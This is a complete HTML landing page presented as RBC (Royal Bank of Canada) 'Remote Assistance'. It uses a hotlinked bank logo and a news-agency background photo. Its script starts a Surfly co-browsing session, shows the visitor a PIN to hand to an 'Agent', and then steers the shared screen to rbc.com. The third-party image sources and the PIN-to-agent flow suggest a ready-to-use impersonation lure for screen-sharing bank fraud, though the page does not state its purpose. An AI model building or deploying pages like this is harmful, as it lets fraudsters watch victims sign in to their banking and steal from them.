<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="RBC Remote Banking Assistance - Get help with your banking needs securely">
	<title>RBC Remote Assistance Landing Page</title>
	<style>
		/* Reset and Base Styles */
		:root {
			--primary-color: #0051A5;
			--secondary-color: #007bff;
			--success-color: #28a745;
			--danger-color: #dc3545;
			--text-color: #666;
			--white: #fff;
		}

		body
		{
			margin: 0;
			padding: 0;
			min-height: 100vh;
			background: linear-gradient(rgba(255, 255, 255, 0.9), rgba(255, 255, 255, 0.9)),
						url('https://www.reuters.com/resizer/v2/https%3A%2F%2Fcloudfront-us-east-2.images.arcpublishing.com%2Freuters%2FP5F5PSAMRNKF7C63VTT7N4UF4M.jpg?auth=aee5e5732ec19ec39a0292cf8c3daa1f76954f8ce5f726ee3bd239cd431aa7da&width=1080&quality=80');
			background-size: cover;
			background-position: center;
			background-repeat: no-repeat;
			background-attachment: fixed;
			display: flex;
			justify-content: center;
			align-items: center;
			font-family: Arial, sans-serif;
		}

		.start-btn
		{
			padding: 1rem 2rem;
			font-size: 1.2rem;
			background-color: var(--secondary-color);
			color: var(--white);
			border: none;
			border-radius: 5px;
			cursor: pointer;
			transition: background-color 0.2s ease;
		}

		.start-btn:hover
		{
			background-color: #0056b3;
		}

		.popup-p
		{
			position: fixed;
			top: 0;
			left: 0;
			width: 100vw;
			height: 100vh;
			background: rgba(0, 0, 0, 0.6);
			display: flex;
			justify-content: center;
			align-items: center;
			visibility: hidden;
			opacity: 0;
			transition: opacity 0.3s ease, visibility 0.3s ease;
			z-index:999999999999999;
			will-change: opacity, visibility;
		}

		.popup-content
		{
		background-color: white;
		padding: 2rem;
		border-radius: 10px;
		box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
		text-align: center;
		width: 300px;
		}

		.popup-text
		{
		margin-bottom: 2rem;
		font-size: 1.2rem;
		}

		.popup-pin-code {
		margin-bottom: 2rem;
		font-size: 2rem;
		}

		.popup-buttons
		{
		display: flex;
		justify-content: space-around;
		}

		.popup-btn
		{
		padding: 0.8rem 1.5rem;
		font-size: 1rem;
		border: none;
		border-radius: 5px;
		cursor: pointer;
		transition: background-color 0.3s ease;
		}

		.cancel-btn
		{
		background-color: #dc3545;
		color: white;
		}

		.cancel-btn:hover
		{
		background-color: #c82333;
		}

		.continue-btn
		{
		background-color: #28a745;
		color: white;
		}

		.continue-btn:hover
		{
		background-color: #218838;
		}

		.show
		{
			visibility: visible;
			opacity: 1;
		}

		.landing-container {
			background-color: rgba(255, 255, 255, 0.95);
			border-radius: 12px;
			box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
			max-width: 800px;
			margin: 2rem auto;
			padding: 2rem;
			font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
		}

		.header {
			text-align: center;
			margin-block-end: 2rem;
		}

		.logo {
			max-width: 200px;
			height: auto;
			width: auto;
			display: inline-block;
		}

		.main-content {
			text-align: center;
			contain: content;
		}

		h1 {
			color: #0051A5;
			font-size: clamp(1.75rem, 5vw, 2.5rem);
			margin-block-end: 1rem;
			line-height: 1.2;
		}

		.subtitle {
			color: #666;
			font-size: clamp(1rem, 3vw, 1.2rem);
			margin-block-end: 2rem;
		}

		.info-box {
			background-color: #f5f5f5;
			border-radius: 8px;
			padding: 2rem;
			margin-block-end: 2rem;
			text-align: left;
			box-shadow: 0 2px 4px rgba(0,0,0,0.1);
		}

		.info-box h2 {
			color: #0051A5;
			margin-block-end: 1rem;
			margin-block-start: 0;
		}

		.info-box ul {
			list-style-type: none;
			padding: 0;
			margin: 0;
		}

		.info-box li {
			margin-block-end: 0.5rem;
			padding-inline-start: 1.5rem;
			position: relative;
		}

		.info-box li:before {
			content: "â€¢";
			color: #0051A5;
			position: absolute;
			left: 0;
			top: 0;
		}

		@media (max-width: 480px) {
			.landing-container {
				padding: 1rem;
			}
			
			.info-box {
				padding: 1.5rem;
			}
		}

		@media print {
			.landing-container {
				padding: 0;
			}
			
			.info-box {
				border: 1px solid #ccc;
				box-shadow: none;
			}

			.start-btn,
			.popup-p {
				display: none;
			}
		}

		/* Add loading state */
		.start-btn.loading {
			opacity: 0.7;
			cursor: wait;
		}

		/* Add focus styles for accessibility */
		.start-btn:focus,
		.popup-btn:focus {
			outline: 2px solid var(--primary-color);
			outline-offset: 2px;
		}
	</style>
</head>

<body>
	<div class="landing-container">
		<div class="header">
			<img src="https://logos-world.net/wp-content/uploads/2021/02/Royal-Bank-of-Canada-Logo-700x394.png" alt="Company Logo" class="logo">
		</div>
		
		<div class="main-content">
			<h1>Welcome to Remote Assistance</h1>
			<p class="subtitle">We're here to help you with your banking needs</p>
			
			<div class="info-box">
				<h2>Before we begin:</h2>
				<ul>
					<li>This session will allow us to see your screen</li>
					<li>We can guide you through your banking needs</li>
					<li>Your security and privacy are our top priority</li>
				</ul>
			</div>

			<!-- Start Session Button -->
			<button class="start-btn" onclick="startCorowsing()">Start Session</button>
		</div>
	</div>
	<!-- Hidden Pin Pop-Up -->
	<div class="popup-p" id="popup-pin">
	<div class="popup-content">
	<p class="popup-text">Please share the following 4-digit PIN with your Agent</p>
	<p class="popup-pin-code" id="popup-pin-code"></p>
	<div class="popup-buttons">
		<button class="popup-btn cancel-btn" onclick="endSession()">End Session</button>
	</div>
	</div>
	</div>

	<script>
	// Use strict mode for better error catching
	'use strict';

	// Cache DOM elements
	const popupPin = document.getElementById('popup-pin');
	const popupPinCode = document.getElementById('popup-pin-code');
	const startButton = document.querySelector('.start-btn');

	// Utility functions
	const showPopupPin = () => popupPin.classList.add('show');
	const hidePopupPin = () => popupPin.classList.remove('show');

	// Surfly integration
	let SurflySession;
	let isInitialized = false;  // Track initialization state
	
	async function startCorowsing() {
		if (startButton.classList.contains('loading')) return; // Prevent double clicks
		
		try {
			startButton.classList.add('loading');
			
			if (!isInitialized) {
				// Load Surfly script only once
				await loadSurflyScript();
				
				const settings = {
					// Add your widget key here
					widget_key: '4e3d97b9f9c549b798eb8735a4b7c619',
					block_until_agent_joins: false,
					session_autorestore_enabled: false,
					verbose: false
				};

				await new Promise((resolve) => {
					Surfly.init(settings, (init) => {
						isInitialized = true;
						resolve(init);
					});
				});
			}

			// Start the session directly if already initialized
			if (Surfly && !Surfly.isInsideSession) {
				SurflySession = Surfly.session().startLeader()
					.on('session_created', handleSessionCreated)
					.on('participant_joined', handleParticipantJoined);
			}
		} catch (error) {
			console.error('Failed to start co-browsing:', error);
		} finally {
			startButton.classList.remove('loading');
		}
	}

	function handleSessionCreated(session) {
		popupPinCode.innerText = session.pin;
		showPopupPin();
	}

	function handleParticipantJoined(session) {
		hidePopupPin();
		// Add your starting URL here
		SurflySession.relocate('https://www.rbc.com', false);
	}

	function endSession() {
		if (SurflySession) {
			SurflySession.end();
		}
		hidePopupPin();
	}

	// Utility to load Surfly script
	function loadSurflyScript() {
		return new Promise((resolve, reject) => {
			const script = document.createElement('script');
			script.src = 'https://surfly.com/surfly.js';
			script.async = true;
			script.onload = resolve;
			script.onerror = reject;
			document.head.appendChild(script);
		});
	}
	</script>
</body>

</html>